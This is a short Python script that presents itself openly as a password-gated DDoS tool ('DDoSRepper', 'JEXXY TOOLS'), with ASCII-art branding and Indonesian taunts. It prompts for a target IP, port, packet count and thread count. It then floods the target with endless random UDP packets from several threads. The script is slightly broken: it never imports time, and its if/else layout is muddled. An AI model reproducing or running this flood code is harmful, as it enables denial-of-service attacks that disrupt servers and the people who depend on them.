import random
import socket
import threading
import os,sys

pwd = input('Password: ')
if pwd == 'DRipperZ':
  print('Connecting To DDoSRepper Tools....')
  time.sleep(7)
  print('Successfully entered the DDoSRepper Tools, Please Try the Facilities Provided')
  time.sleep(8)
  os.system("clear")
  print('''
    Kazuya DRepperZ



╔═══╦═══╗────────────╔════╗
╚╗╔╗║╔═╗║────────────╚══╗═║
─║║║║╚═╝╠══╦══╦══╦══╦═╗╔╝╔╝
─║║║║╔╗╔╣║═╣╔╗║╔╗║║═╣╔╬╝╔╝
╔╝╚╝║║║╚╣║═╣╚╝║╚╝║║═╣╠╝═╚═╗
╚═══╩╝╚═╩══╣╔═╣╔═╩══╩╩════╝
───────────║║─║║
───────────╚╝─╚╝
''')

print("dont abuse, dosa tanggung sendiri")
print("JEXXY TOOLS")
ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input("ATTACK? (y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(900)
	i = random.choice(("[]","[]","[]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"JEXXY AND TEAM ATTACK YOU SERVER")
		except:
			print("[X] ATTACK YOUR IP")

def run2():
	data = random._urandom(900)
	i = random.choice(("[]","[]","[]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" JEXXY AND TEAM ATTACK YOU SERVER")
		except:
			s.close()
			print("[X] JEXXY AND TEAM ATTACK YOU IP")

def run3():
	data = random._urandom(900)
	i = random.choice(("[]","[]","[]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" JEXXY AND TEAM ATTACK YOU SERVER")
		except:
			s.close()
			print("[X] JEXXY AND TEAM ATTACK YOU IP")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
else:
  print('Kasian gatau pasword nya')
  quit()